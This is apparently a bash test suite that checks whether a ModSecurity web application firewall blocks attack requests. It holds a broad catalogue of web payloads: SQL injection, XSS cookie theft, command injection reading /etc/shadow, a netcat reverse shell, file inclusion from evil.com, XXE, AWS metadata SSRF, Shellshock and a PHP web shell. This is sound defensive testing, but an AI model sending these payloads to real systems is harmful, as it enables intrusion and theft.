#!/bin/bash

# ============================================================================
# Comprehensive WAF Security Test Suite
# Tests ModSecurity with OWASP CRS protection
# ============================================================================

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Test counters
PASSED=0
FAILED=0
WARNINGS=0

# Base URL
BASE_URL="${1:-https://localhost}"

echo -e "${BLUE}============================================================================${NC}"
echo -e "${BLUE}        WAF COMPREHENSIVE SECURITY TEST SUITE${NC}"
echo -e "${BLUE}============================================================================${NC}"
echo -e "${CYAN}Testing against: ${BASE_URL}${NC}"
echo ""

# Function to test attack and verify blocking
test_attack() {
    local test_name="$1"
    local url="$2"
    local method="${3:-GET}"
    local data="${4:-}"
    local expected_code="${5:-403}"
    local headers="${6:-}"
    
    echo -ne "${YELLOW}Testing:${NC} ${test_name}... "
    
    local response
    if [ "$method" = "POST" ]; then
        if [ -n "$headers" ]; then
            response=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST --data-raw "$data" -H "$headers" "$url" 2>&1 | tail -1)
        else
            response=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST --data-raw "$data" "$url" 2>&1 | tail -1)
        fi
    else
        if [ -n "$headers" ]; then
            response=$(curl -k -s -o /dev/null -w "%{http_code}" -H "$headers" "$url" 2>&1 | tail -1)
        else
            response=$(curl -k -s -o /dev/null -w "%{http_code}" "$url" 2>&1 | tail -1)
        fi
    fi
    
    # Handle curl errors
    if [[ ! "$response" =~ ^[0-9]{3}$ ]]; then
        echo -e "${YELLOW}⚠ CONNECTION ERROR${NC}"
        WARNINGS=$((WARNINGS + 1))
        return
    fi
    
    if [ "$response" = "$expected_code" ]; then
        echo -e "${GREEN}✓ BLOCKED ($response)${NC}"
        PASSED=$((PASSED + 1))
    elif [ "$response" = "200" ] && [ "$expected_code" != "200" ]; then
        echo -e "${RED}✗ NOT BLOCKED ($response - Expected $expected_code)${NC}"
        FAILED=$((FAILED + 1))
    else
        echo -e "${YELLOW}⚠ UNEXPECTED ($response - Expected $expected_code)${NC}"
        WARNINGS=$((WARNINGS + 1))
    fi
}

# ============================================================================
echo -e "\n${MAGENTA}[1] SQL INJECTION ATTACKS${NC}"
# ============================================================================
test_attack "SQL - Union Select" \
    "${BASE_URL}/api/users?id=1%27%20UNION%20SELECT%20NULL"

test_attack "SQL - OR 1=1" \
    "${BASE_URL}/api/login?user=admin%27%20OR%20%271%27%3D%271"

test_attack "SQL - Time-based blind" \
    "${BASE_URL}/api/search?q=test%27%20AND%20SLEEP(5)--"

test_attack "SQL - Boolean blind" \
    "${BASE_URL}/api/product?id=1%27%20AND%201%3D1--"

test_attack "SQL - DROP TABLE" \
    "${BASE_URL}/api/delete?id=1%27%3B%20DROP%20TABLE%20users--"

test_attack "SQL - EXEC xp_cmdshell" \
    "${BASE_URL}/api/test?id=1%3B%20EXEC%20xp_cmdshell"

test_attack "SQL - INTO OUTFILE" \
    "${BASE_URL}/api/export?data=1%27%20INTO%20OUTFILE"

test_attack "SQL - LOAD_FILE" \
    "${BASE_URL}/api/read?file=1%27%20AND%20LOAD_FILE"

# ============================================================================
echo -e "\n${MAGENTA}[2] CROSS-SITE SCRIPTING (XSS) ATTACKS${NC}"
# ============================================================================
test_attack "XSS - Basic script tag" \
    "${BASE_URL}/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"

test_attack "XSS - IMG onerror" \
    "${BASE_URL}/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"

test_attack "XSS - SVG onload" \
    "${BASE_URL}/?data=%3Csvg%2Fonload%3Dalert%281%29%3E"

test_attack "XSS - JavaScript protocol" \
    "${BASE_URL}/?url=javascript%3Aalert%28document.cookie%29"

test_attack "XSS - Event handler" \
    "${BASE_URL}/?input=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E"

test_attack "XSS - Iframe injection" \
    "${BASE_URL}/?content=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E"

test_attack "XSS - Base64 encoded" \
    "${BASE_URL}/?code=%3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E"

test_attack "XSS - DOM-based" \
    "${BASE_URL}/%23%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"

# ============================================================================
echo -e "\n${MAGENTA}[3] COMMAND INJECTION ATTACKS${NC}"
# ============================================================================
test_attack "CMD - Semicolon separator" \
    "${BASE_URL}/api/ping?host=127.0.0.1%3Bls%20-la"

test_attack "CMD - Pipe separator" \
    "${BASE_URL}/api/exec?cmd=whoami%7Ccat%20%2Fetc%2Fpasswd"

test_attack "CMD - AND operator" \
    "${BASE_URL}/api/run?script=test.sh%20%26%26%20cat%20%2Fetc%2Fshadow"

test_attack "CMD - Backticks" \
    "${BASE_URL}/api/process?data=%60id%60"

test_attack "CMD - Command substitution" \
    "${BASE_URL}/api/shell?input=%24%28whoami%29"

test_attack "CMD - Netcat reverse shell" \
    "${BASE_URL}/api/test?cmd=nc%20-e%20%2Fbin%2Fsh"

test_attack "CMD - Curl data exfiltration" \
    "${BASE_URL}/api/curl?url=http%3A%2F%2Fevil.com"

# ============================================================================
echo -e "\n${MAGENTA}[4] PATH TRAVERSAL / DIRECTORY TRAVERSAL${NC}"
# ============================================================================
test_attack "Path - Basic traversal" \
    "${BASE_URL}/files?file=../../../etc/passwd"

test_attack "Path - Windows style" \
    "${BASE_URL}/download?path=..\\..\\..\\windows\\system32\\config\\sam"

test_attack "Path - URL encoded" \
    "${BASE_URL}/read?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

test_attack "Path - Double encoding" \
    "${BASE_URL}/api/file?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

test_attack "Path - Null byte injection" \
    "${BASE_URL}/view?doc=../../../etc/passwd%00.jpg"

test_attack "Path - Absolute path" \
    "${BASE_URL}/static?file=/etc/passwd"

# ============================================================================
echo -e "\n${MAGENTA}[5] REMOTE CODE EXECUTION (RCE)${NC}"
# ============================================================================
test_attack "RCE - PHP code injection" \
    "${BASE_URL}/api/eval?code=<?php system('whoami'); ?>"

test_attack "RCE - eval() injection" \
    "${BASE_URL}/api/calc?expr=eval('import os; os.system(\"ls\")')"

test_attack "RCE - Serialization exploit" \
    "${BASE_URL}/api/deserialize?data=O:8:\"stdClass\":1:{s:4:\"exec\";s:8:\"whoami\";}"

test_attack "RCE - Template injection" \
    "${BASE_URL}/api/render?template={{7*7}}"

test_attack "RCE - SSTI (Server-Side Template Injection)" \
    "${BASE_URL}/api/page?name={{config.items()}}"

# ============================================================================
echo -e "\n${MAGENTA}[6] LOCAL FILE INCLUSION (LFI)${NC}"
# ============================================================================
test_attack "LFI - Direct inclusion" \
    "${BASE_URL}/page?include=/etc/passwd"

test_attack "LFI - PHP wrapper" \
    "${BASE_URL}/index?page=php://filter/convert.base64-encode/resource=index.php"

test_attack "LFI - Data wrapper" \
    "${BASE_URL}/api?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="

test_attack "LFI - Log poisoning" \
    "${BASE_URL}/view?log=/var/log/apache2/access.log"

# ============================================================================
echo -e "\n${MAGENTA}[7] REMOTE FILE INCLUSION (RFI)${NC}"
# ============================================================================
test_attack "RFI - HTTP inclusion" \
    "${BASE_URL}/page?include=http://evil.com/shell.txt"

test_attack "RFI - FTP inclusion" \
    "${BASE_URL}/load?file=ftp://attacker.com/malware.php"

# ============================================================================
echo -e "\n${MAGENTA}[8] XML ATTACKS${NC}"
# ============================================================================
test_attack "XXE - External entity" \
    "${BASE_URL}/api/xml" \
    "POST" \
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>" \
    "403" \
    "Content-Type: application/xml"

test_attack "XXE - Parameter entity" \
    "${BASE_URL}/api/parse" \
    "POST" \
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]><root></root>" \
    "403" \
    "Content-Type: application/xml"

test_attack "XML - Billion laughs (DoS)" \
    "${BASE_URL}/api/xml" \
    "POST" \
    "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>" \
    "403" \
    "Content-Type: application/xml"

# ============================================================================
echo -e "\n${MAGENTA}[9] SERVER-SIDE REQUEST FORGERY (SSRF)${NC}"
# ============================================================================
test_attack "SSRF - Internal IP" \
    "${BASE_URL}/api/fetch?url=http://127.0.0.1:8080/admin"

test_attack "SSRF - Localhost" \
    "${BASE_URL}/api/proxy?target=http://localhost/internal"

test_attack "SSRF - AWS metadata" \
    "${BASE_URL}/api/curl?url=http://169.254.169.254/latest/meta-data/"

test_attack "SSRF - File protocol" \
    "${BASE_URL}/api/download?url=file:///etc/passwd"

test_attack "SSRF - Dict protocol" \
    "${BASE_URL}/api/fetch?url=dict://localhost:11211/stats"

# ============================================================================
echo -e "\n${MAGENTA}[10] LDAP INJECTION${NC}"
# ============================================================================
test_attack "LDAP - Authentication bypass" \
    "${BASE_URL}/api/ldap?user=admin)(&(password=*))"

test_attack "LDAP - OR injection" \
    "${BASE_URL}/auth?username=*)(uid=*"

# ============================================================================
echo -e "\n${MAGENTA}[11] SECURITY SCANNER DETECTION${NC}"
# ============================================================================
test_attack "Scanner - SQLMap" \
    "${BASE_URL}/" \
    "GET" \
    "" \
    "403" \
    "User-Agent: sqlmap/1.0"

test_attack "Scanner - Nikto" \
    "${BASE_URL}/" \
    "GET" \
    "" \
    "403" \
    "User-Agent: Nikto/2.1.6"

test_attack "Scanner - Nmap NSE" \
    "${BASE_URL}/" \
    "GET" \
    "" \
    "403" \
    "User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"

test_attack "Scanner - Acunetix" \
    "${BASE_URL}/" \
    "GET" \
    "" \
    "403" \
    "User-Agent: Acunetix"

test_attack "Scanner - Burp Suite" \
    "${BASE_URL}/" \
    "GET" \
    "" \
    "403" \
    "User-Agent: Mozilla/5.0 (compatible; BurpSuite)"

# ============================================================================
echo -e "\n${MAGENTA}[12] PROTOCOL VIOLATIONS${NC}"
# ============================================================================
test_attack "Protocol - Invalid HTTP method" \
    "${BASE_URL}/api/test" \
    "TRACE"

test_attack "Protocol - Content-Type mismatch" \
    "${BASE_URL}/api/json" \
    "POST" \
    "not-json-data" \
    "403" \
    "Content-Type: application/json"

test_attack "Protocol - Missing Host header" \
    "${BASE_URL}/" \
    "GET" \
    "" \
    "403" \
    "Host:"

# ============================================================================
echo -e "\n${MAGENTA}[13] SESSION & AUTHENTICATION ATTACKS${NC}"
# ============================================================================
test_attack "Session - Fixation" \
    "${BASE_URL}/login?session_id=attacker_controlled_id"

test_attack "Session - Cookie injection" \
    "${BASE_URL}/profile" \
    "GET" \
    "" \
    "403" \
    "Cookie: admin=true; role=administrator"

# ============================================================================
echo -e "\n${MAGENTA}[14] CODE INJECTION${NC}"
# ============================================================================
test_attack "Code - JavaScript injection" \
    "${BASE_URL}/api/execute?code=require('child_process').exec('ls')"

test_attack "Code - Python injection" \
    "${BASE_URL}/api/run?script=__import__('os').system('id')"

test_attack "Code - Ruby injection" \
    "${BASE_URL}/api/eval?expr=system('whoami')"

# ============================================================================
echo -e "\n${MAGENTA}[15] HTTP REQUEST SMUGGLING${NC}"
# ============================================================================
test_attack "Smuggling - Content-Length mismatch" \
    "${BASE_URL}/api/test" \
    "POST" \
    "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n" \
    "403" \
    "Content-Length: 5"

# ============================================================================
echo -e "\n${MAGENTA}[16] BUFFER OVERFLOW / DOS${NC}"
# ============================================================================
test_attack "DoS - Large header" \
    "${BASE_URL}/" \
    "GET" \
    "" \
    "403" \
    "X-Large-Header: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

test_attack "DoS - Many parameters" \
    "${BASE_URL}/api?param1=val1&param2=val2&param3=val3&param4=val4&param5=val5"

# ============================================================================
echo -e "\n${MAGENTA}[17] SHELLSHOCK${NC}"
# ============================================================================
test_attack "Shellshock - CGI exploit" \
    "${BASE_URL}/cgi-bin/test.cgi" \
    "GET" \
    "" \
    "403" \
    "User-Agent: () { :; }; echo vulnerable"

# ============================================================================
echo -e "\n${MAGENTA}[18] MALICIOUS FILE UPLOAD${NC}"
# ============================================================================
test_attack "Upload - PHP shell" \
    "${BASE_URL}/upload" \
    "POST" \
    "<?php system(\$_GET['cmd']); ?>"

test_attack "Upload - Double extension" \
    "${BASE_URL}/upload?filename=shell.php.jpg"

# ============================================================================
echo -e "\n${MAGENTA}[19] HTTP RESPONSE SPLITTING${NC}"
# ============================================================================
test_attack "Response - Header injection" \
    "${BASE_URL}/redirect?url=http://evil.com%0d%0aSet-Cookie:admin=true"

# ============================================================================
echo -e "\n${MAGENTA}[20] LEGITIMATE TRAFFIC (Should be ALLOWED)${NC}"
# ============================================================================
echo -ne "${YELLOW}Testing:${NC} Normal GET request... "
response=$(curl -k -s -o /dev/null -w "%{http_code}" "${BASE_URL}/" 2>/dev/null)
if [ "$response" = "200" ]; then
    echo -e "${GREEN}✓ ALLOWED ($response)${NC}"
    PASSED=$((PASSED + 1))
else
    echo -e "${RED}✗ BLOCKED ($response - Expected 200)${NC}"
    FAILED=$((FAILED + 1))
fi

echo -ne "${YELLOW}Testing:${NC} Normal POST request... "
response=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST -d "username=user&password=pass" "${BASE_URL}/api/login" 2>/dev/null)
if [ "$response" = "200" ] || [ "$response" = "401" ] || [ "$response" = "404" ]; then
    echo -e "${GREEN}✓ ALLOWED ($response)${NC}"
    PASSED=$((PASSED + 1))
else
    echo -e "${RED}✗ FALSE POSITIVE ($response)${NC}"
    FAILED=$((FAILED + 1))
fi

echo -ne "${YELLOW}Testing:${NC} Valid JSON API request... "
response=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{"name":"John","age":30}' "${BASE_URL}/api/users" 2>/dev/null)
if [ "$response" = "200" ] || [ "$response" = "201" ] || [ "$response" = "404" ]; then
    echo -e "${GREEN}✓ ALLOWED ($response)${NC}"
    PASSED=$((PASSED + 1))
else
    echo -e "${RED}✗ FALSE POSITIVE ($response)${NC}"
    FAILED=$((FAILED + 1))
fi

# ============================================================================
# SUMMARY
# ============================================================================
echo ""
echo -e "${BLUE}============================================================================${NC}"
echo -e "${BLUE}                         TEST SUMMARY${NC}"
echo -e "${BLUE}============================================================================${NC}"
echo -e "${GREEN}Passed:  ${PASSED}${NC}"
echo -e "${RED}Failed:  ${FAILED}${NC}"
echo -e "${YELLOW}Warnings: ${WARNINGS}${NC}"
echo -e "${BLUE}Total:   $((PASSED + FAILED + WARNINGS))${NC}"
echo ""

TOTAL=$((PASSED + FAILED + WARNINGS))
if [ $TOTAL -gt 0 ]; then
    PERCENTAGE=$((PASSED * 100 / TOTAL))
    echo -e "${CYAN}Protection Rate: ${PERCENTAGE}%${NC}"
fi

echo ""
echo -e "${CYAN}ModSecurity Configuration:${NC}"
echo "  - Check logs: docker logs frontend | tail -50"
echo "  - Audit log: docker exec frontend tail -20 /var/log/modsec/audit.log"
echo "  - Debug log: docker exec frontend tail -20 /var/log/modsec/debug.log"
echo ""

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}🎉 All critical security tests passed! WAF is working correctly.${NC}"
    exit 0
else
    echo -e "${RED}⚠️  Some attacks were not blocked. Review WAF configuration.${NC}"
    exit 1
fi
